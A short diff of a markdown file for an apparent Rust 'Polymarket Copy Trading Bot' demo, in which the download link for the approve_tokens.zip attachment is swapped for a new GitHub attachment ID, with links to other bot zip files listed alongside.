@@ -20,7 +20,7 @@ https://polygonscan.com/tx/0x7f3552f2da30d362c68afe885b8c7a64e38a19e59b5872b4025
 
 ### **Polymarket Copy Trading Bot - Rust (Demo)**  
 - 🗂️ [validate_setup.zip](https://github.com/user-attachments/files/24820052/validate_setup.zip)
-- 🗂️ [approve_tokens.zip](https://github.com/user-attachments/files/24819723/approve_tokens.zip)
+- 🗂️ [approve_tokens.zip](https://github.com/user-attachments/files/24889543/approve_tokens.zip)
 - 🗂️ [confirmed_block_bot.zip](https://github.com/user-attachments/files/24819758/confirmed_block_bot.zip)
 - 🗂️ [mempool_bot.zip](https://github.com/user-attachments/files/24887683/mempool_bot.zip)
 
